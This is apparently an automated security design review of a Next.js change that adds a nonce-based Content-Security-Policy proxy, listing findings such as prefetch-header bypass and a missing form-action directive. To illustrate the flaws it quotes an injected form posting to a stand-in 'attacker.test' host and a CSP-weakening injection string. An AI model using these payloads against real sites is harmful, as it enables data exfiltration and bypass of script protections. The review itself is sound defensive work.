# Security Design Review — strict CSP with per-request nonces (iteration 2)

**Scope:** `git diff d86d2dc..HEAD` in `/workspace/runs/review-arms/e3-loops/wt-csp-arm2` (branch `e3/csp-arm2`)
**Commit:** 99e1229
**Reviewed:** 2026-08-06
**Files in range:** `proxy.ts` (new), `proxy.test.ts` (new), `app/layout.tsx`, `app/lib/utils/exportGraph.ts`, `app/lib/utils/exportGraph.test.ts`
**Foundation:** merged code-fact-check (k=3) accepted as given; documented behaviour is not re-verified. Prior-iteration rubric (`/workspace/runs/review-arms/e1/csp-dirty/code-review-rubric.md`) read as advisory; R1–R4 dispositions and the security-domain ambers (A5, A6, A7, A9, G1) were re-checked against the code at 99e1229 rather than carried forward.

**HALT-ESCALATE:** Not triggered. None of the five canonical patterns (hardcoded credentials, authentication/authorization bypass in a live path, remote code execution, SQL injection, secret exfiltration) is present in this range.

---

## Trust boundaries

This change adds a new request-processing hop in front of every HTML render, and moves one browser-side data conversion off the network stack. Five boundaries are crossed.

**B1: Untrusted HTTP client (arbitrary request headers) → `proxy()` clones request headers, overwrites `Content-Security-Policy` and `x-nonce`, forwards via `NextResponse.next({ request })` → Next's `app-render` `parseRequestHeaders`, which derives the script nonce from the *request* `content-security-policy` header and stamps it onto bootstrap `<script>` tags.**
This is the boundary the iteration-1 fix created. Before 99e1229 the nonce never reached the renderer; now the renderer's nonce is read from a request header, and that header is server-authoritative *only on paths where the proxy runs*. `node_modules/next/dist/server/app-render/app-render.js:166` reads `headers['content-security-policy'] || headers['content-security-policy-report-only']` off the incoming request with no provenance check — the framework cannot distinguish a proxy-set header from a client-set one. The proxy's `.set` (not `.append`) is what makes the boundary hold on matched paths.

**B2: Client-controlled routing headers (`next-router-prefetch`, `purpose: prefetch`) and the request path → `config.matcher` evaluation → whether the CSP control executes at all.**
The control is opt-*out* by data the requester supplies. This is the classic inverted-access-control shape: the security decision is delegated to the party the control exists to constrain.

**B3: `toPng()` output (`data:` URL, in-browser) → `dataUrlToBlob` parses the media type and decodes the payload → `Blob` → `URL.createObjectURL` inside `triggerDownload` (a same-origin `blob:` URL attached to a live `<a>` in the document), or a zip entry via `exportAll.ts:64`.**
Previously this transition went through `fetch()`, which applied the browser's URL parsing and MIME handling. The fix replaces a browser-implemented parser with 22 lines of hand-written parsing, and the resulting media type is attacker-influenceable if a future caller ever passes a non-`toPng` data URL.

**B4: Caller-supplied string → `buildCsp(nonce)` template interpolation → the `Content-Security-Policy` value on both the request and the response.**
New in this iteration: `buildCsp` was module-private at d90d6bb and is exported at 99e1229 (the R3 fix). The trusted-input assumption that made the old call site safe is now a contract with external callers, and it is unstated and unenforced.

**B5: Rendered HTML carrying a baked-in nonce → HTTP response caching (framework `Cache-Control`, CDN, shared proxy) → a different viewer's browser.**
Also new in effect: pre-fix, the HTML contained no nonce, so nonce/HTML pairing was moot. Post-fix the pairing is load-bearing — a cached document reused against a fresh response header means every script on the page is refused.

---

## Findings

#### CSP is omitted entirely from any response the requester flags as a prefetch

**Severity:** Medium
**Location:** `proxy.ts:63-70`
**Boundary:** B2
**Move:** Inverted access control
**Confidence:** High (mechanism); Medium (blast radius, which depends on how the App Router promotes prefetched documents)
**Evidence:**
```
  matcher: [
    {
      source: "/((?!api|_next/static|_next/image|favicon.ico).*)",
      missing: [
        { type: "header", key: "next-router-prefetch" },
        { type: "header", key: "purpose", value: "prefetch" },
      ],
    },
  ],
```
**Legibility-target:** for-author

Prior amber A5, re-checked: still present verbatim, and the iteration-1 fix makes it worse rather than better. A request carrying `purpose: prefetch` or `next-router-prefetch` does not run the proxy at all. That means (a) the response carries no `Content-Security-Policy` header, and (b) — this part is new at 99e1229 — the render also receives no request-side CSP, so Next stamps *no* `nonce` attribute on the bootstrap scripts it emits. Pre-fix, prefetched and non-prefetched documents were byte-identical in their script tags; post-fix they diverge, and only one of the two shapes is covered by any test in `proxy.test.ts`.

Two consequences follow. First, an unprivileged requester chooses whether the site's only XSS control applies to the document it receives — a curl with one extra header, or an intermediary that normalises `purpose`, is enough. Second, if a prefetched (un-nonced, policy-free) document is ever promoted into the visible tab by the router or a shared cache, the user is browsing with the control silently absent; there is no client-side signal distinguishing that state from the protected one.

The stated rationale in the comment at `proxy.ts:60-62` — prefetches "would otherwise burn a nonce on a request that may never paint" — is a cost argument about a `crypto.randomUUID()` call. That is not a cost worth trading a security control for.

**Recommendation:** Delete the `missing:` block and apply the policy unconditionally to matched paths. If prefetch responses genuinely must be distinguished, distinguish them *inside* `proxy()` (where the decision is server-side) rather than by declining to run. Add a `proxy.test.ts` case asserting the CSP header is present on a request bearing `purpose: prefetch`.

---

#### `form-action` is absent, leaving the policy's own threat model half-covered

**Severity:** Medium
**Location:** `proxy.ts:20-30`
**Boundary:** B1
**Move:** Implicit sanitization / incomplete control
**Confidence:** High
**Evidence:**
```
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self' data:",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "object-src 'none'",
```
**Legibility-target:** for-author

Prior amber A7, re-checked: still open, and now materially more relevant. The header comment at `proxy.ts:9-10` states the policy's purpose as keeping "a hypothetical injected `<script>` tag from executing even if something slipped past markdown sanitization." Injected markup is not limited to `<script>`: an injected `<form action="https://attacker.test" method="post">` combined with an autosubmit or a clickjacked control exfiltrates whatever the user types, and `form-action` is one of the CSP directives that does **not** fall back to `default-src`. The same is true of `base-uri` and `object-src` — both of which the author did include, which is what makes the omission read as an oversight rather than a decision.

The app has no cross-origin forms (`app/` contains a single route), so `form-action 'self'` is free.

Note this is the *complete* set of non-fallback directives that matters here: `frame-ancestors`, `base-uri`, `object-src` are present; `sandbox` and `report-*` are intentionally not policy-restricting. `worker-src`, `frame-src`, `manifest-src` and `media-src` all fall back to `default-src 'self'` and are correctly covered.

**Recommendation:** Add `"form-action 'self'"` to the directives array and to the expected-key list in `proxy.test.ts:20-30`.

---

#### `buildCsp` is exported with an unvalidated `nonce` parameter interpolated into the policy

**Severity:** Low
**Location:** `proxy.ts:19-22`
**Boundary:** B4
**Move:** Serialization / injection across a newly widened surface
**Confidence:** High
**Evidence:**
```
export function buildCsp(nonce: string): string {
  const directives = [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
```
**Legibility-target:** for-author

This is a defect the iteration-1 fix introduced. At d90d6bb `buildCsp` was module-private, so its only caller was `proxy()` at line 39, which passes a base64 string whose alphabet (`A-Za-z0-9+/=`) cannot escape the quoted `'nonce-…'` token. The prior review's P1/P2 rested on exactly that scoping. Exporting the function to satisfy R3's testability requirement turns an internal invariant into an unenforced public contract: `buildCsp` now accepts any string and splices it into a security policy.

A caller passing `"x' 'unsafe-inline"` yields `script-src 'self' 'nonce-x' 'unsafe-inline' 'strict-dynamic'`; passing a string containing `;` appends or replaces arbitrary directives. Response splitting is not reachable — `Headers.set` rejects CR/LF — so the impact is confined to policy weakening, and there is no untrusted caller today (`buildCsp` is referenced only by `proxy.ts:39` and `proxy.test.ts`). That is why this is Low and not higher. But the function is now the repo's designated, tested, importable CSP constructor: the next caller is precisely the situation the export invites.

**Recommendation:** Either (a) validate at the boundary — `if (!/^[A-Za-z0-9+/=_-]+$/.test(nonce)) throw new Error(...)` — with a test asserting the rejection, or (b) remove the parameter entirely and have `buildCsp()` generate the nonce and return `{ nonce, csp }`, which is also a cleaner unit to test and eliminates the possibility of the two values disagreeing.

---

#### The render nonce is derived from a request header the client controls on any path the proxy skips

**Severity:** Low
**Location:** `proxy.ts:46-50`, `proxy.ts:63-70`
**Boundary:** B1
**Move:** Implicit trust in an inbound header
**Confidence:** High (mechanism, verified against the pinned framework source); Low (present-day exploitability)
**Evidence:**
```
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set("Content-Security-Policy", csp);
  // Overwrite (not append) so a client-supplied x-nonce cannot be smuggled
  // through to a server component.
  requestHeaders.set("x-nonce", nonce);
```
**Legibility-target:** for-orchestrator-synthesis

The comment above `x-nonce` shows the author reasoned about header smuggling for `x-nonce` but not for the header that actually matters. Next reads the nonce from the *request* `content-security-policy` header (`app-render.js:166-167`, also accepting `content-security-policy-report-only`) with no check of where that header came from. On matched paths the `.set` on line 47 makes this safe — the client's value is overwritten before forwarding, and that is a real defence, correctly implemented.

The gap is that the set of paths where the proxy runs and the set of paths where Next reads the header are not the same set. On every path the matcher excludes (prefetch-flagged requests per the finding above, and the prefix-matched exclusions per the finding below), a client-supplied `content-security-policy: script-src 'nonce-attacker'` request header is parsed and `nonce-attacker` is stamped onto the emitted script tags. Today this is inert, because those same responses also carry no CSP response header, so nothing enforces the nonce — and browsers cannot set custom headers on a top-level navigation, so an attacker can only do this to themselves. That caps present severity at Low.

What makes it worth recording is the coupling it creates: the safety of the renderer's nonce input now depends on the matcher and on there being exactly one place that sets response CSP headers. `next.config.ts` is empty today, but it is the other natural home for security headers (a `headers()` entry there would apply to *all* paths, including the excluded ones) — and the moment a policy is applied from a second layer, a client-controlled nonce input on the proxy-excluded paths becomes a live mismatch.

**Recommendation:** Strip client-supplied `content-security-policy` and `content-security-policy-report-only` request headers unconditionally, and note in the `proxy.ts` header comment that Next reads the nonce off the request header so any future narrowing of the matcher must preserve that stripping. Widening the matcher to cover all HTML paths (per the prefetch finding) also closes this.

---

#### Nonce/HTML cache pairing is protected only by a framework default, with nothing asserting it

**Severity:** Low
**Location:** `app/layout.tsx:26`; `proxy.ts:55`
**Boundary:** B5
**Move:** TOCTOU across a caching layer
**Confidence:** Medium
**Evidence:**
```
export const dynamic = "force-dynamic";
```
```
  response.headers.set("Content-Security-Policy", csp);
```
**Legibility-target:** for-orchestrator-synthesis

Prior amber A6, re-checked, and the disposition has changed: the R4 fix substantially mitigates it, incidentally. `dynamic = "force-dynamic"` sets the route's revalidate to 0, and `node_modules/next/dist/server/lib/cache-control.js:12-15` returns `'private, no-cache, no-store, max-age=0, must-revalidate'` for `revalidate === 0`. So CSP-bearing documents should ship `no-store` in practice, which is the correct barrier.

The residual concern is that this is emergent, undocumented and untested. Neither `proxy.ts` nor `layout.tsx` sets `Cache-Control` or `Vary`; nothing in `proxy.test.ts` asserts a cache header; and `next.config.ts` is empty. The invariant "the nonce in the response header matches the nonce baked into the body" is now load-bearing for the first time (pre-fix the body contained no nonce), and it is held up entirely by a framework internal that a later `export const revalidate = 60`, a `unstable_cache` addition, or a CDN configured to ignore `no-store` would remove — with a total-blank-page failure mode and no test to catch it.

**Recommendation:** Set `Cache-Control: no-store` explicitly on the response in `proxy()` alongside the CSP header, and add a `proxy.test.ts` assertion for it. That makes the coupling visible at the place that creates it, and survives changes to the layout's rendering mode.

---

#### The policy ships enforce-only, with no violation reporting and no Report-Only stage

**Severity:** Low
**Location:** `proxy.ts:20-30`, `proxy.ts:55`
**Boundary:** B1
**Move:** Error paths / observability of a control's failure
**Confidence:** High
**Legibility-target:** for-author

99e1229 is the first commit at which this policy actually constrains rendering — pre-fix, `'strict-dynamic'` refused Next's own bootstrap scripts and the app never hydrated, so no real usage exercised the directive set. The policy therefore goes from "never meaningfully enforced" to "enforced for every visitor" in a single step, with no `report-to`/`report-uri` directive and no Report-Only rollout. The prior review's R1 remediation explicitly recommended shipping Report-Only first; the fix did not.

The failure mode this leaves is poor: a directive that is too tight (the `style-src` carve-out is the documented fragile one, and `img-src`/`font-src` cover only what today's code happens to need) produces a broken page for the user and no signal at all for the operator. `proxy.test.ts` asserts the directive *names* and the nonce plumbing, which is the right thing to unit-test, but a unit test cannot tell you which resource a real browser refused.

**Recommendation:** Add a `report-to`/`report-uri` endpoint, or ship one release emitting `Content-Security-Policy-Report-Only` alongside (or instead of) the enforcing header before enforcing. Note that if a Report-Only header is added, Next will fall back to reading *it* for the nonce when the enforcing header is absent (`app-render.js:166`) — keep both values in sync if both are set.

---

#### Matcher exclusions are unanchored prefix matches

**Severity:** Low
**Location:** `proxy.ts:65`
**Boundary:** B2
**Move:** Million-of-these / rule that decays as the codebase grows
**Confidence:** High
**Evidence:**
```
      source: "/((?!api|_next/static|_next/image|favicon.ico).*)",
```
**Legibility-target:** for-author

Prior amber A9, re-checked: unchanged. The negative lookahead matches a prefix, not a path segment. Any future top-level route whose name begins with one of these strings — `/apidocs`, `/api-status`, `/favicon.ico.bak`, `/_next/imageproxy` — is silently exempted from the CSP, with no error and no test failure. Today the app has exactly one route (`app/page.tsx`), so nothing is affected; the finding is that the rule's correctness degrades with route additions and there is no mechanism that would surface the degradation.

Conversely, the five SVGs in `public/` *do* match and receive the policy, which is a small security positive worth keeping: an SVG served from the same origin and navigated to directly is a script-execution context, and `script-src 'nonce-…' 'strict-dynamic'` refuses any script inside it.

**Recommendation:** Anchor each exclusion to a segment or file boundary — `/((?!api(?:/|$)|_next/static/|_next/image/|favicon\.ico$).*)` — and add a `proxy.test.ts` case asserting that a path like `/apidocs` is matched.

---

#### `dataUrlToBlob` types the Blob from unvalidated input, behind a guard that implies validation

**Severity:** Low
**Location:** `app/lib/utils/exportGraph.ts:23-44`
**Boundary:** B3
**Move:** Implicit sanitization; error paths
**Confidence:** High (the parsing behaviour); Low (present-day reachability)
**Evidence:**
```
export function dataUrlToBlob(dataUrl: string): Blob {
  const commaIndex = dataUrl.indexOf(",");
  if (!dataUrl.startsWith("data:") || commaIndex === -1) {
    throw new Error("Not a data: URL");
  }
  const header = dataUrl.slice("data:".length, commaIndex);
  const payload = dataUrl.slice(commaIndex + 1);
  const isBase64 = header.endsWith(";base64");
  const mediaType =
    (isBase64 ? header.slice(0, -";base64".length) : header).split(";")[0] ||
    "application/octet-stream";
```
**Legibility-target:** for-author

The R2 fix is the right shape — decoding in-process rather than widening `connect-src` to `data:` is the tighter of the two options the prior review offered, and both call sites were converted. Three observations about what the replacement inherits.

First, the media type is taken verbatim from the input and flows into `new Blob(..., { type: mediaType })`, then into `URL.createObjectURL` at `app/lib/utils/export.ts:8`. Both current callers pass `toPng()` output, which is always `image/png`, so nothing is reachable today. But the function is exported, generically named, has its own test file, and opens with a guard that *looks* like input validation while checking only the `data:` prefix — the combination invites a future caller to pass a data URL that came from a pasted document, an uploaded file, or an LLM response. A `text/html` Blob turned into a same-origin `blob:` URL is a script-execution context; here it is mitigated by `triggerDownload` always setting `a.download` (which forces a download rather than a navigation) and by blob URLs inheriting the creator's CSP — but neither mitigation is stated anywhere, and neither is a property of `dataUrlToBlob` itself.

Second, the `;base64` detection is case- and whitespace-sensitive (`;BASE64` or `;base64 ` fall through to the percent-decoding branch), and that branch builds the Blob from a JavaScript *string*, so the bytes are re-encoded as UTF-8 rather than preserved. For a mis-detected base64 payload this silently corrupts the output rather than failing. The test at `exportGraph.test.ts:29-33` covers only the well-formed lowercase case.

Third, error paths: `atob` throws `InvalidCharacterError` on malformed base64 and `decodeURIComponent` throws `URIError` on a lone `%`, and neither `downloadGraphAsPng` nor `graphToPngBlob` has a `catch` — so a malformed input surfaces as an unhandled promise rejection with no user-visible feedback. This is unchanged in kind from the pre-fix `fetch()` behaviour, so the fix neither introduced nor resolved it; recording it so the iteration-1 remediation is not read as having closed it.

**Recommendation:** Take the expected media type as a parameter (`dataUrlToBlob(dataUrl, { expect: "image/png" })`) and throw on mismatch, or allowlist `image/*`. Lowercase `header` before the `;base64` test. Add a `catch` at the two call sites that surfaces an export failure to the user.

---

#### `/api` is exempt from the proxy with no `nosniff` backstop, and no other security headers exist anywhere

**Severity:** Informational
**Location:** `proxy.ts:65`; `next.config.ts:3-5`
**Boundary:** B2
**Move:** Million-of-these
**Confidence:** High
**Evidence:**
```
const nextConfig: NextConfig = {
  /* config options here */
};
```
**Legibility-target:** for-author

Prior finding G1, re-checked: unchanged. The 16 route handlers under `app/api/` never run the proxy, so they receive no `Content-Security-Policy`, no `X-Content-Type-Options: nosniff`, and no `Referrer-Policy`; `next.config.ts` defines no `headers()` either, so no such header exists anywhere in the repo. For JSON-returning handlers the practical exposure is a content-sniffing path on a response whose `Content-Type` a client can influence. Separately, since the proxy does not run on `/api`, any handler that reads `x-nonce` would read the *caller-supplied* value — the overwrite at `proxy.ts:50` does not protect these routes. No handler reads it today.

**Recommendation:** Add `X-Content-Type-Options: nosniff` (and `Referrer-Policy: strict-origin-when-cross-origin`) via `next.config.ts` `headers()` so they apply to `/api` too, and record in a decision note that `proxy.ts` owns CSP while `next.config.ts` owns static security headers — the two-homes ambiguity is otherwise resolved by whoever adds the next header.

---

#### `x-nonce` remains a wire contract with zero readers

**Severity:** Informational
**Location:** `proxy.ts:48-50`
**Boundary:** B1
**Move:** Dead control surface
**Confidence:** High
**Evidence:** `rg -n "x-nonce|nonce" app/ --glob '!*.test.*'` at 99e1229 returns only two comment lines in `app/layout.tsx:22-23`; no `<Script nonce=…>` and no `headers().get("x-nonce")` exists.
**Legibility-target:** for-author

Prior amber A4, re-checked: still open, though its character changed. Pre-fix, `x-nonce` was the *only* nonce plumbing and it was inert; post-fix, the real mechanism is the request `Content-Security-Policy` header (which `proxy.test.ts:78-93` correctly falsifies) and `x-nonce` is a spare. The layout comment at line 25 now explicitly says "nothing here reads it directly," so the code and its documentation agree — that is an improvement over d90d6bb.

The security-relevant residue is small: a header crossing into server-component scope that nothing consumes is a thing a future contributor may start trusting, and its protection (the `.set` overwrite) does not extend to `/api`. `proxy.test.ts:95-116` does pin the overwrite behaviour, so the guarantee is at least tested.

**Recommendation:** Delete `x-nonce` and its test, or land the `<Script nonce>` consumer that justifies it. Keeping an untested-consumer header indefinitely is the state that produced R1.

---

#### Nonce construction is sound but round-about

**Severity:** Informational
**Location:** `proxy.ts:35-37`
**Boundary:** B4
**Move:** Crypto
**Confidence:** High
**Evidence:**
```
  // Generate a fresh nonce per request. crypto.randomUUID and Buffer are both
  // available in the Edge runtime that Next proxy runs in.
  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
```
**Legibility-target:** for-author

Prior finding G2, re-checked: unchanged. `crypto.randomUUID()` is a CSPRNG and 122 bits is far above the ~128-bit-equivalent guidance for nonces, so there is no unpredictability concern. It base64-encodes the 36-character UUID *string* rather than 16 random bytes, producing a 48-character nonce where 24 would do, on a header that repeats on every response and cannot be HPACK-compressed (it changes each time). The comment's "Edge runtime" claim is incorrect per the fact-check foundation and does not affect behaviour. Not a vulnerability; noted so it is not mistaken for one on a later read.

**Recommendation:** `Buffer.from(crypto.getRandomValues(new Uint8Array(16))).toString("base64")`, and drop the runtime claim from the comment.

---

## What Looks Good

- **The R1 fix is correct and correctly falsified.** Setting the policy on the forwarded request headers (`proxy.ts:47`) is exactly what `app-render.js:166-167` reads, and `proxy.test.ts:78-93` decodes Next's `x-middleware-override-headers` / `x-middleware-request-*` encoding to assert it — a test that genuinely fails if the line is removed, rather than restating the implementation. The helper's docblock explains *why* that decoding is necessary. This is the single most valuable artifact in the diff: it is the test that would have caught R1.
- **Header smuggling on matched paths is closed and pinned.** `requestHeaders.set("x-nonce", nonce)` overwrites rather than appends, and `proxy.test.ts:95-107` asserts an attacker-supplied value does not survive.
- **Freshness is asserted, not assumed.** `proxy.test.ts:109-114` compares two independent invocations' policies, so a refactor that hoists the nonce to module scope fails a test.
- **The R2 fix chose the tighter option.** Decoding `data:` in-process keeps `connect-src 'self'` rather than widening it to `data:` for an export helper, and both call sites were converted — no `fetch(dataUrl)` remains.
- **The R4 fix is the right mechanism.** `export const dynamic = "force-dynamic"` is a declarative, greppable, deletion-resistant statement of the rendering-mode requirement, replacing a bare `await headers();` whose only trace was a side effect. It also incidentally supplies the `no-store` barrier discussed above.
- **The directive set is otherwise complete.** `frame-ancestors 'none'`, `base-uri 'self'` and `object-src 'none'` cover the three non-fallback directives that matter besides `form-action`; `worker-src`, `frame-src`, `media-src` and `manifest-src` all correctly inherit `default-src 'self'`. On the prior review's contested G3: pdf.js's worker is loaded from a bundler-rewritten same-origin URL (`app/lib/utils/fileExtraction.ts:26-29` resolves against `import.meta.url`, emitting an asset under `/_next/static/`), so the `default-src 'self'` fallback permits it — no `worker-src` gap.
- **No CSP-injection path exists from the live call site.** The nonce reaching `buildCsp` at `proxy.ts:39` is base64-alphabet-only, and Next additionally rejects nonces containing HTML escape characters (`get-script-nonce-from-header.js:34-40`). The injection concern above is specifically about the *newly exported* surface, not this path.
- **`connect-src 'self'` holds.** All LLM calls go through the 16 same-origin route handlers under `app/api/`; the browser makes no third-party requests.

---

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence | Prior status |
|---|---------|----------|----------|----------|------------|--------------|
| 1 | CSP omitted entirely on client-flagged prefetch requests | Medium | B2 | `proxy.ts:63-70` | High / Medium | A5, still open — worsened by fix |
| 2 | `form-action` absent | Medium | B1 | `proxy.ts:20-30` | High | A7, still open |
| 3 | Exported `buildCsp` interpolates an unvalidated nonce | Low | B4 | `proxy.ts:19-22` | High | **New — introduced by R3 fix** |
| 4 | Render nonce readable from a client-supplied request header on unmatched paths | Low | B1 | `proxy.ts:46-50, 63-70` | High / Low | **New — surfaced by R1 fix** |
| 5 | Nonce/HTML cache pairing rests on an untested framework default | Low | B5 | `app/layout.tsx:26`; `proxy.ts:55` | Medium | A6, largely closed by R4 fix |
| 6 | Matcher exclusions are unanchored prefix matches | Low | B2 | `proxy.ts:65` | High | A9, still open |
| 7 | Enforce-only rollout, no violation reporting | Low | B1 | `proxy.ts:20-30, 55` | High | R1 remediation advice not taken |
| 8 | `dataUrlToBlob` types the Blob from unvalidated input | Low | B3 | `app/lib/utils/exportGraph.ts:23-44` | High / Low | **New — introduced by R2 fix** |
| 9 | `/api` exempt; no `nosniff`/`Referrer-Policy` anywhere | Informational | B2 | `proxy.ts:65`; `next.config.ts:3-5` | High | G1, still open |
| 10 | `x-nonce` has zero readers | Informational | B1 | `proxy.ts:48-50` | High | A4, still open |
| 11 | Nonce is base64 of a UUID string | Informational | B4 | `proxy.ts:35-37` | High | G2, still open |

---

## Overall Assessment

The iteration-1 fixes land. R1's remediation is the substantive one: the policy now actually reaches the renderer, verified against the framework source rather than asserted, and pinned by a test that fails when the wiring is removed. R2, R3 and R4 are each implemented as the prior review recommended, and R4 additionally closes most of amber A6 as a side effect. No finding in this review re-opens R1–R4.

Three of the eleven findings are new defects the fixes introduced, and all three follow the same pattern: a change made a previously-internal thing external, and the trust assumption that held internally was not restated at the new boundary. `buildCsp` went from private-with-a-safe-caller to exported-with-any-caller (#3). Request-header CSP went from unused to renderer-consumed, making an inbound header meaningful on paths the proxy does not cover (#4). `dataUrlToBlob` went from an inline `fetch` to an exported parser whose media-type handling is now the caller's problem (#8). None is presently exploitable; all three are Low precisely because the reachable caller set is still exactly one. They are worth fixing now, while that is still true, and each fix is a few lines.

The two Mediums are both carried-forward ambers that the prior review classified correctly and that this iteration did not address. #1 (prefetch exemption) is the one I would prioritise: it is the only finding where an unprivileged requester decides whether the control applies, its stated justification is a negligible performance saving, and the fix is deleting five lines. #2 (`form-action`) is a one-line addition that completes the policy against the threat the policy's own comment names.

The rollout shape is the remaining concern that is not a code defect. This commit takes a policy from never-actually-enforced to enforced-for-everyone with no reporting endpoint and no Report-Only stage, which means the first evidence of an over-tight directive will be a user with a broken page. The unit tests are good at what unit tests can do here and cannot substitute for that.

---

## Goal-Alignment Note

- **Answered:** Whether the four iteration-1 fixes introduce new security defects (yes — three, all Low, all the same widened-boundary pattern); the current status of each security-domain amber carried from the prior review (A5 open and worsened, A6 largely closed by the `force-dynamic` fix, A7 open, A9 open, G1 open, plus G2/G3 resolved); and a fresh boundary-level pass over the whole `d86d2dc..HEAD` range rather than only the fix commit.
- **Out of scope:** The performance cost of `force-dynamic` on every route (prior A8 — a product decision, and the performance critic's domain); test coverage adequacy beyond the security assertions named above (`test-strategy`'s domain); the documentation-accuracy defects supplied by the merged fact-check, which I treated as foundation and did not re-verify — specifically the Tailwind `style-src` rationale at `proxy.ts:12-14`, the "Edge runtime" claim at `proxy.ts:35-36`, and the "OpenAlex" reference at `proxy.ts:16`; the absent decision record for an app-wide security control (prior G4).
- **Escalate:** Nothing meets HALT-ESCALATE. For orchestrator synthesis, two items want a decision the code cannot supply: finding #5 needs the author's deployment topology (is there a CDN in front of this, and does it honour `no-store`?), and finding #7 needs a call on whether a Report-Only release is acceptable before enforcing — both are questions to the author, not defects to assign.
